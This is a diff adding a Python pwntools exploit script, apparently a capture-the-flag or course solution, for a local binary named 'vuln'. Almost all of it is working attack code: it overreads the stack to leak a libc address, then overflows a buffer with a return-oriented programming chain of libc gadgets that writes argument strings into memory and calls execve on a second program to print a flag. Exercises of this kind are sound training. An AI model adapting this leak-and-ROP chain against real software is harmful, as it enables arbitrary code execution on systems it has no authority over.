@@ -1,0 +1,181 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./vuln", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# first, we will lay out how we would exploit vuln;
+# as checksec shows, vuln has no canaries enabled, but supports PIE.
+# our aim is to be able to build a ROP chain.
+# this happens in vuln(), where we are able to overflow return addresses onto the stack
+# since PIE is enabled, first we need to leak some information that allows us the calculate the offsets
+# this we can do in main()
+# in the read, we can enter fill characters, so that in the subsequent puts we leak items from the stack
+# e.g. execve is at __libc_start_main+242 (the ret addr of main, which is at buffer+0x28) +0xa526e
+
+# secondly, we will lay out how execmewithrop has to be run in order to leak the flag;
+# in ghidra, we observe main. The params are: argc, argv and envp.
+# the following requirements are made:
+# - argv != 0
+# - envp != 0
+# - within envp, one string must be "PABE=FUN"
+# - argc must be 3
+# - argv+8, or the first param, must be "foo"
+# - argv+0x10, or the second param, must be "bar"
+# this results in:
+# execve("./execute_me_with_rop", {"./execute_me_with_rop","foo","bar",0}, {"PABE=FUN",0});
+# (the envp may contain more elements, there is no restriction, but the above is naturally the easiest solution)
+
+# finally, we need to construct the ropchain
+# using ```ROPgadget --binary /usr/lib/libc-2.32.so | grep "ASSEMBLY"```
+# we can find gadgets in the libc (I totally didn't first look for gadgets in ld.so ...)
+# 0x0000000000036160 : mov qword ptr [rdx], rax ; ret
+# 0x0000000000040780 : pop rax ; ret
+# 0x000000000013a4a6 : pop rdx ; pop rbx ; ret
+# 0x0000000000027b15 : pop rdi ; ret
+# 0x0000000000029d8f : pop rsi ; ret
+
+def main():
+
+    mainplus242_offset = 0x28152
+    execve_offset = 0xcd3c0
+    # start of RW memory in libc
+    write_mem_offset = 0x1c2000
+    # this offset is better, since there are 400+ empty bytes
+    write_mem_offset = 0x1c4da0
+    mov_qwptr_rdx_rax_offset = 0x36160
+    pop_rax_offset = 0x40780
+    pop_rdx_pop_rbx_offset = 0x13a4a6
+    pop_rdi_offset = 0x27b15
+    pop_rsi_offset = 0x29d8f
+
+    io = start()
+    # away with the stuff :)
+    io.recvuntil("Can you leak me? : ")
+    # overwriting the buffer until the return addr
+    buf = [b"a"] * 0x28
+    raw = b"".join(buf)
+    io.write(raw)
+    # this is the addr of __libc_start_main+242
+    leak = io.recvuntil("data!\n")[66:72]
+    leak_padded = b"".join([leak] + [b"\x00"*(8-len(leak))])
+    mainplus242_addr = struct.unpack("<Q", leak_padded)[0]
+    # with which we now can construct the addresses of libc:
+    libc_addr = mainplus242_addr - mainplus242_offset
+    # which we can use to grab further addresses
+    pop_rdx_pop_rbx = struct.pack("<Q", libc_addr + pop_rdx_pop_rbx_offset)
+    pop_rax = struct.pack("<Q", libc_addr + pop_rax_offset)
+    pop_rdi = struct.pack("<Q", libc_addr + pop_rdi_offset)
+    pop_rsi = struct.pack("<Q", libc_addr + pop_rsi_offset)
+    mov_qwptr_rdx_rax = struct.pack("<Q", libc_addr + mov_qwptr_rdx_rax_offset)
+    write_mem = struct.pack("<Q", libc_addr + write_mem_offset)
+
+    # lets construct the payload
+
+    # fill the buffer
+    payload = b'a'*0x108
+
+    # first, we need to write this to the writable region:
+    # "./execut", "e_me_wit", "h_rop\0fo", "o\0bar\0PA", "BE=FUN\0\0"
+
+    payload += pop_rdx_pop_rbx
+    payload += write_mem
+    payload += b'a'*8
+    payload += pop_rax
+    payload += b'./execut'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x8)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += b'e_me_wit'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x10)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += b'h_rop\x00fo' # okay because gets is used
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x18)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += b'o\x00bar\x00PA'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x20)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += b'BE=FUN\x00\x00'
+    payload += mov_qwptr_rdx_rax
+
+    # now, we need to prepare the registers for the call:
+    # first, we need to write two pointers to the memory, argv and envp
+
+    # envp
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x28)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x1e)
+    payload += mov_qwptr_rdx_rax   
+
+    # argv
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x30)
+    payload += b'a'*8
+    payload += pop_rax
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0)
+    payload += mov_qwptr_rdx_rax   
+
+    # set RDX to envp
+    payload += pop_rdx_pop_rbx
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x28)
+    payload += b'a'*8
+
+
+    # set RSI to argv
+    payload += pop_rsi
+    payload += struct.pack("<Q", libc_addr + write_mem_offset + 0x30)
+
+    # set RDI to argv[0]
+    payload += pop_rdi
+    payload += write_mem
+
+    # call execve:
+    payload += struct.pack("<Q", libc_addr+execve_offset)
+
+    # sanity check
+    assert len(payload) % 8 == 0
+    payload += b'\n'
+
+    # put together payload and grab the flag
+    io.write(payload)
+
+    resp = io.recvuntil("}")
+    print(resp.split()[-1].decode())
+    io.close()
+
+if __name__ == "__main__":
+    main()
